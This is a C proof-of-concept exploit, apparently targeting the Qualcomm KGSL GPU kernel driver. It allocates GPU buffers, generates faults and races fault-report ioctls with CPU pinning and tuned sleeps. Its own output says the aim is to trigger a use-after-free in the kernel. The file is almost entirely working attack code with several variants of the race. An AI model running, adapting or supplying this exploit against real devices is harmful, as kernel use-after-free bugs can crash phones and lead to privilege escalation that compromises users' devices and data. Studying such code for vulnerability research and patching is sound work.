#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <stdatomic.h>
#include <pthread.h>
#include <signal.h>
#include <string.h>
#include <sched.h>
#include <ctype.h>
#include <sys/wait.h>
#include <time.h>

#include "cpu_utils.h"
#include "kgsl_struct.h"
#include "kgsl.h"

int iterations = 40;
int *arr;  // dynamic array to hold alloc IDs

struct thread_args {
    int alloc_id;
    struct timespec ts;
};

// Thread wrappers
void *thread_func(void *arg) {
    int alloc_id = *(int *)arg;
    printf("[*] Creating fault for alloc_id: %d\n", alloc_id);
    create_fault(alloc_id);
    printf("[+] Created fault for alloc_id: %d\n", alloc_id);
    return NULL;
}

// Thread wrapper for create_fault
void *thread_create_fault(void *arg) {
    if(migrate_to_cpu(0) < 0)
        printf("[-] CPU Pinning Failed for Create Fault Thread\n");
    struct thread_args *args = (struct thread_args *)arg;
    nanosleep(&args->ts, NULL);
    create_fault(args->alloc_id);
    return NULL;
}

// Thread wrapper for ioctl_fault_report
void *thread_ioctl_report(void *arg) {
    if(migrate_to_cpu(0) < 0)
        printf("[-] CPU Pinning Failed for Fault Report Thread\n");
    struct thread_args *args = (struct thread_args *)arg;
    nanosleep(&args->ts, NULL);
    ioctl_fault_report();
    return NULL;
}

int approach_1(){
    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = 50 * 1000000;

    init();

    arr = malloc(sizeof(int) * iterations);

    for (int i=0;i<iterations;i++)
    {
        printf("[*] Creating buffer id: %d\n",i);
        arr[i] = alloc_gpumem(4096*(i+1));
        printf("[+] Created allocation id: %d\n",arr[i]);

    }

    for (int i=0;i<iterations;i++)
    {
        printf("[*] Creating fault for alloc_id: %d\n",arr[i]);
        create_fault(arr[i]);
        nanosleep(&ts, NULL);
        printf("[+] Created fault for alloc_id: %d\n",arr[i]);

    }

    printf("[*] Getting the fault report...\n");
    sleep(1);
    ioctl_fault_report();

    free(arr);
    return 0;
}

int approach_1_thread(){
    init();

    pthread_t threads[iterations];

    arr = malloc(sizeof(int) * iterations);

    // Step 1: Allocate buffers
    for (int i = 0; i < iterations; i++) {
        printf("[*] Creating buffer id: %d\n", i);
        arr[i] = alloc_gpumem(4096 * (i + 1));
        printf("[+] Created allocation id: %d\n", arr[i]);
    }

    // Step 2: Create threads for faults
    for (int i = 0; i < iterations; i++) {
        if (pthread_create(&threads[i], NULL, thread_func, &arr[i]) != 0) {
            perror("pthread_create failed");
            free(arr);
            return 1;
        }
    }

    // Step 3: Join threads
    for (int i = 0; i < iterations; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("[*] Getting the fault report...\n");

    sleep(1);

    ioctl_fault_report();

    free(arr);
    return 0;
}

int approach_2(){
    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = 350 * 1000000; // may change depending on device

    init();

    printf("[*] Allocating Buffers...\n");
    int alloc_id1 = alloc_gpumem(4096);
    int alloc_id2 = alloc_gpumem(4096);

    printf("[*] Creating 1st Fault...\n");
    create_fault(alloc_id1);
    printf("[*] Sleeping for 5 seconds to reach threshold...\n");
    sleep(5);
    printf("[*] Creating 2nd Fault...\n");
    create_fault(alloc_id2);

    printf("[*] Getting the fault report...\n");
    nanosleep(&ts, NULL);
    ioctl_fault_report();

    return 0;
}

int approach_2_thread(){

    migrate_to_cpu(0);

    pthread_t tid1, tid2;

    init();

    printf("[*] Allocating Buffers...\n");
    int alloc_id1 = alloc_gpumem(4096);
    int alloc_id2 = alloc_gpumem(4096);

    // may change depending on device
    struct thread_args args1 = {
        .alloc_id = alloc_id2,
        .ts = { .tv_sec = 0, .tv_nsec = 1000 * 1000000 } // 1000ms
    };

    struct thread_args args2 = {
        .alloc_id = 0,
        .ts = { .tv_sec = 0, .tv_nsec = 338 * 1000000 } // 338ms
    };

    printf("[*] Creating 1st Fault...\n");
    create_fault(alloc_id1);
    printf("[*] Sleeping for 5 seconds to reach threshold...\n");
    sleep(5);
    printf("[*] Creating 2nd Fault and Getting the fault report...\n");

    // Create threads
    if (pthread_create(&tid1, NULL, thread_create_fault, &args1) != 0) {
        perror("pthread_create (create_fault)");
        exit(1);
    }

    if (pthread_create(&tid2, NULL, thread_ioctl_report, &args2) != 0) {
        perror("pthread_create (ioctl_fault_report)");
        exit(1);
    }

    // Wait for both threads
    pthread_join(tid1, NULL);
    pthread_join(tid2, NULL);

    printf("If you're seeing this msg, it means the UaF didn't trigger :(. Trying again...\n");

    return 0;
}

int main() {

    int count = 0;

    approach_1();
    // approach_1_thread();
    // approach_2();

    // while(1){
    // printf("\n");
    // printf("Attempt #%d\n",++count);
    // approach_2_thread();
    // }

}